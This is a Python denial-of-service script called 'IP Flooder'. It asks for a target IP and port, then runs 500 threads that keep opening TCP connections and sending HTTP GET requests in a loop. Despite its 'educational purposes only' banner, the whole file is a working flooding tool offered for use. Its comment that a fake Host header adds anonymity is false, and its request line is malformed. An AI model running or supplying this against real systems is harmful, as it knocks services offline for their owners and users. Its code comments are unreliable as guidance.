import socket
import datetime
from datetime import datetime as dt
import sys
import threading

print("#" * 20)
print("IP Flooder, Educational Purposes Only!")
print("#" * 20)
print("Enjoy! P.s: Only test on machines you own, I am not responsible for any illegal actions taken through this application!")
print("#" * 20)

target = input("Enter Target IP or Domain Name.\n") #target you wanna send the attack to

port = input("Enter attack port.\n") # port to send packets through, port 80 is for http for example

fake_ip = '193.12.13.145' #creating fake ip for more anonymity on request headers

already_connected = 0

error_found = False
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, int(port)))

            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, int(port)))
            s.sendto((f"Host: {fake_ip}\r\n\r\n").encode('ascii'), (target, int(port)))
            s.close()

            global already_connected
            already_connected += 1

            global error_found

            if already_connected % 500 == 0:
                print("500 Connections sent")
        except KeyboardInterrupt:
            print("Shutting down.")
            error_found = True
            sys.exit()
        except socket.gaierror:
            error_found = True
            print("Connection could not be established, shutting down.")
            sys.exit()
        except:
            error_found = True
        
for i in range(500):
    if error_found == False:
        thread = threading.Thread(target=attack)
        thread.start()
    else:
        pass